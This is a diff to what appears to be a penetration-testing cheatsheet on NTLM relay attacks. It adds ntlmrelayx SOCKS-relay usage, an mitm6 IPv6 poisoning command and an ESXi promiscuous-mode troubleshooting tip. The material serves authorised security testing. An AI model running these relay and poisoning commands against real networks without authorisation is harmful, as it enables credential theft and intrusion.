@@ -64,7 +64,7 @@ python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support
 
 #### Relaying with SOCKS
 
-We can also enable SOCKS support while relaying for interactive sessions.&#x20;
+We can also enable SOCKS support while relaying for interactive sessions. Using this flag will also provide you with a session on the host if the user is not a local administrator:
 
 ```bash
 python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support --socks
@@ -86,6 +86,16 @@ Additionally, the following command demonstrates running mitm6 with the `--ignor
 sudo mitm6 -d $domain --ignore-nofqnd
 ```
 
+#### Troubleshooting
+
+If your testing machine was provisioned in ESXi, the following setting needs to be modified via the web console:
+
+```bash
+Networking -> VM Network -> Edit Settings -> Promiscuous Mode: Accept
+
+# mitm6 can then be ran with the --no-ra flag.
+```
+
 ### References
 
 {% embed url="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" %}
@@ -97,3 +107,5 @@ sudo mitm6 -d $domain --ignore-nofqnd
 {% embed url="https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/exploitation/exploit-without-account/smb-relay" %}
 
 {% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6" %}
+
+{% embed url="https://www.secureauth.com/blog/playing-with-relayed-credentials/" %}
